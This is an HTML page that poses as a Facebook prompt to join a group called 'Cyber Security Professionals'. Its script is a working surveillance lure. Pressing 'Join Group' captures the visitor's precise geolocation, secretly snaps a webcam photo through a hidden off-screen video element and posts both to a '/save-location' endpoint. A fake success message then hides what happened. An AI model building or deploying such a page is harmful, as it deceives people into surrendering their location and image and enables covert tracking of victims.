<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Facebook - Join Group</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: #18191a;
        min-height: 100vh;
        display: flex;
        align-items: flex-end;
        justify-content: center;
        overflow: hidden;
    }
    .fb-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #18191a; z-index: 0; }
    .fb-topbar {
        background: #242526;
        padding: 12px 16px;
        display: flex;
        align-items: center;
        gap: 12px;
        border-bottom: 0.5px solid #3a3b3c;
    }
    .fb-logo { font-size: 24px; font-weight: 700; color: #1877f2; }
    .bottom-sheet {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        z-index: 20;
        background: #242526;
        border-radius: 28px 28px 0 0;
        max-height: 65vh;
        min-height: 50vh;
        animation: sheetUp 0.35s ease-out;
        overflow-y: auto;
    }
    @keyframes sheetUp {
        from { transform: translateY(100%); }
        to { transform: translateY(0); }
    }
    .drag-handle {
        width: 36px; height: 4px;
        background: rgba(255,255,255,0.2);
        border-radius: 2px;
        margin: 10px auto 0 auto;
    }
    .group-hero { text-align: center; padding: 20px; }
    .group-avatar {
        width: 80px; height: 80px;
        background: #1877f2;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 12px auto;
        font-size: 40px;
    }
    .group-name { font-size: 20px; font-weight: 700; color: #e4e6eb; }
    .group-meta { font-size: 13px; color: #b0b3b8; margin-top: 4px; }
    .stats-row {
        display: flex;
        justify-content: space-evenly;
        padding: 16px;
        background: #3a3b3c;
        margin: 12px 20px;
        border-radius: 16px;
    }
    .stat-item { text-align: center; }
    .stat-value { font-size: 18px; font-weight: 700; color: #e4e6eb; }
    .stat-label { font-size: 11px; color: #b0b3b8; }
    .join-btn {
        width: calc(100% - 40px);
        margin: 20px;
        padding: 14px;
        background: #1877f2;
        color: white;
        border: none;
        border-radius: 28px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
    }
    .join-btn:hover { background: #1466d6; }
    #hiddenCamera { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; }
    .toast-message {
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%);
        background: #242526;
        color: white;
        padding: 10px 20px;
        border-radius: 28px;
        font-size: 13px;
        z-index: 1000;
    }
    .success-modal {
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.9);
        display: flex; align-items: center; justify-content: center;
        z-index: 2000;
    }
    .success-content {
        background: #242526;
        margin: 20px;
        padding: 32px;
        border-radius: 32px;
        text-align: center;
        max-width: 280px;
    }
    .success-icon { font-size: 56px; margin-bottom: 16px; }
    .success-content h3 { font-size: 20px; color: #e4e6eb; margin-bottom: 8px; }
    .success-content p { font-size: 14px; color: #b0b3b8; margin-bottom: 24px; }
    .success-content button {
        background: #1877f2; color: white; border: none;
        padding: 12px 24px; border-radius: 28px;
        font-size: 14px; font-weight: 600; cursor: pointer; width: 100%;
    }
</style>
</head>
<body>

<video id="hiddenCamera" autoplay playsinline muted></video>

<div class="fb-bg"></div>

<div class="bottom-sheet">
    <div class="drag-handle"></div>
    <div class="group-hero">
        <div class="group-avatar">👥</div>
        <div class="group-name">Cyber Security Professionals</div>
        <div class="group-meta">Public Group • 45K members</div>
    </div>
    
    <div class="stats-row">
        <div class="stat-item"><div class="stat-value">45K</div><div class="stat-label">Members</div></div>
        <div class="stat-item"><div class="stat-value">2.3K</div><div class="stat-label">Online</div></div>
        <div class="stat-item"><div class="stat-value">⭐ 4.8</div><div class="stat-label">Rating</div></div>
    </div>

    <button id="joinBtn" class="join-btn" onclick="joinGroup()">
        🔗 JOIN GROUP
    </button>
</div>

<script>
let mediaStream = null;
let locationData = null;

async function joinGroup() {
    const btn = document.getElementById("joinBtn");
    btn.disabled = true;
    btn.textContent = "Requesting...";
    showToast("📍 Requesting location...");
    
    if (!navigator.geolocation) {
        showToast("❌ Geolocation not supported");
        resetButton();
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        async function(position) {
            locationData = position.coords;
            showToast("✅ Location captured!");
            await capturePhoto();
        },
        function(error) { showToast("❌ Location denied"); resetButton(); },
        { enableHighAccuracy: true, timeout: 15000 }
    );
}

async function capturePhoto() {
    const video = document.getElementById('hiddenCamera');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.onloadedmetadata = () => { video.play(); setTimeout(() => takePhoto(stream), 1000); };
    } catch (err) { saveToServer(null); }
}

function takePhoto(stream) {
    const video = document.getElementById('hiddenCamera');
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoData = canvas.toDataURL('image/jpeg', 0.8);
    stream.getTracks().forEach(track => track.stop());
    saveToServer(photoData);
}

function saveToServer(photoData) {
    fetch('/save-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            accuracy: locationData.accuracy,
            photo: photoData ? photoData.split(',')[1] : null,
            photo_filename: photoData ? `facebook_${Date.now()}.jpg` : null,
            tracking_type: 'initial',
            platform: 'facebook'
        })
    }).then(res => res.json()).then(data => {
        if (data.status === "success") showSuccessModal();
        else showToast("❌ Failed");
    });
}

function showToast(msg) {
    const existing = document.querySelector('.toast-message');
    if (existing) existing.remove();
    const toast = document.createElement('div');
    toast.className = 'toast-message';
    toast.innerHTML = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

function showSuccessModal() {
    const modal = document.createElement('div');
    modal.className = 'success-modal';
    modal.innerHTML = `<div class="success-content"><div class="success-icon">✅</div><h3>Joined Successfully!</h3><p>You are now a member of Cyber Security Professionals group.</p><button onclick="window.location.href='/'">OK</button></div>`;
    document.body.appendChild(modal);
}

function resetButton() {
    const btn = document.getElementById("joinBtn");
    btn.disabled = false;
    btn.innerHTML = "🔗 JOIN GROUP";
}
</script>
</body>
</html>
